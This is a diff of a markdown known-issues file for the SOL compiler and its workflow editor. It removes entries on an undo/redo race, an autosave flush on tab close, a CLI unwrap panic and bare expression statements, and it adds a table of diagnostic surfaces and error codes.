-`isReplaying: boolean` plus a `setTimeout(0)` to re-enable
-capture after state restoration. Rapid undo/redo + autosave
-debounces can race; occasionally a snapshot fires before the
-next replay's `isReplaying = true` guard, truncating the redo
-stack.
-
-**Where it lives:** `src/stores/graph.store.ts:927, 961–972,
-980–991`.
-
-**Severity:** **Low.** Rare and mostly cosmetic — the user
-loses a redo step they could redo again from the previous
-state.
-
-**Recommendation:** Use a per-operation token rather than a
-single boolean flag. Each replay carries its own token; the
-debounced snapshot checks "is the most recent replay still
-pending?" via the token.
-
-**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
-
----
-
-### T9036 — Autosave debounce can lose recent changes on tab close
-
-**Category:** tool — UX hazard
-
-**Description:** The autosave fires after 600ms of idle. If the
-user closes the tab during the 600ms window, the most recent
-change is not persisted. There is no `beforeunload` flush.
-
-**Where it lives:** `src/stores/graph.store.ts:994–1006`.
-
-**Severity:** **Medium** — affects every editor session.
-
-**Recommendation:** Add a `beforeunload` listener that
-synchronously flushes the pending save:
-
-```ts
-window.addEventListener('beforeunload', () => {
-    if (saveTimer !== undefined) {
-        window.clearTimeout(saveTimer);
-        try {
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(workflow.value));
-        } catch {}
-    }
-});
-```
-
-**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
-
----
-
-### T9017 — `CliParser` panics on empty or single-character arguments
-
-**Category:** tool — CLI minor
-
-**Description:** The CLI parser (`cli.rs:19–22`) does
-`arg.chars().nth(0).unwrap()` and `arg.chars().nth(1).unwrap()`.
-An empty argv element (`""`) or a single-character argument (`"-"`)
-panics with `called Option::unwrap() on a None value`.
-
-In practice the OS rarely passes empty argv entries and a bare
-`-` is uncommon as a CLI argument, but this is a real
-uncaught-panic surface in tooling that wraps the SOL compiler
-binary.
-
-**Where it lives:** `cli.rs:19–22`.
-
-**Recommendation:** Replace `.unwrap()` with explicit length
-checks and a friendlier diagnostic.
-
----
-
-### T9013 — Bare expression statements emit code that is immediately popped
-
-**Category:** tool — language minor
-
-**Description:** Statements like `100 + 200;` and `f();` (call of
-a non-void function used as a statement) are parser-accepted
-expression statements (chapter 03 §3.4). The bytecode emitter
-compiles them, then immediately emits `Inst::Pop` to discard the
-result (`bytecode.rs:218–223`). The expression's side effects
-happen, but the value is discarded.
-
-**Where it lives:** `bytecode.rs:166–177, 218–223`.
-
-**Recommendation:** Don't write expression statements whose only
-purpose is to compute a value. Either assign to a `let` or omit.
-For function calls whose return value you don't care about, the
-pattern is fine — the implicit `Pop` is exactly what you want.
-
-The fixture `largemini.sol::blockIsolation` uses `100 + 200;` as
-a deliberate no-op inside an isolating block, which is a fine
-illustration of the pattern.
-
-**Related chapter:** [03 §3.4](./03-syntax.md)
-
----
-
-## Maintenance
-
-- New diagnostics are added in this file *first*, then linked from
-  the relevant chapter and from the audit's open-questions table.
-- Each entry must cite a source location and at least one fixture
-  or example.
-- When the compiler adopts numeric codes, this file is the
-  reconciliation point — the provisional `E0xxx` / `E1xxx` /
-  `E2xxx` codes will either be renumbered to match upstream or
-  rewritten as aliases for the upstream scheme.
+## Quick map of the surfaces
+
+| Surface | Source | Codes | Has spans? |
+| --- | --- | --- | --- |
+| Language layer | `sol/src/parser.rs`, `compiler.rs`, `vm.rs` | none (raw `String`) | no |
+| Bridge diagnostics | `compiler-wasm/src/lib.rs` | `E_PARSE`, `E_CODEGEN`, `E_NO_WORKFLOW`, `E_RUNTIME`, `ICE0001` | no (`span: null`) |
+| Runtime error views | `src/runtime-host/types.ts`, `src/compiler/types.ts` | `kind`-tagged union (2 sim, rest wire only) | no |
+| Editor structural validation | `src/graph/validate.ts` | kebab-case (table above) | n/a (node ids) |
